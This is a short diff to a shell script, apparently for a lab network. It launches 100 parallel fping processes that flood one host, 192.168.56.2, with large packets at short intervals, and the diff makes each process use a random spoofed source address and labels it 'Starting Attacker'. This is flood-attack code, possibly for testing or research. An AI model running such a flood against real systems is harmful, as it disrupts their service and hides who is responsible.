@@ -17,7 +17,10 @@ RUN_IP=$(( STARTIP + RANDOM % (ENDIP - STARTIP + 1) ))
 
 MAX_PROCS=100
 for (( i=0; i<$MAX_PROCS; i++ )); do
-  echo "Iteration $i"
+  STARTIP=4
+  ENDIP=254
+  RUN_IP=$(( STARTIP + RANDOM % (ENDIP - STARTIP + 1) ))
+  echo "Starting Attacker $i"
     /usr/bin/timeout 2m /usr/bin/fping -l -b 1470 -p 10 -S 192.168.56.$RUN_IP -l -i 1 192.168.56.2 &
   sleep 1
 done
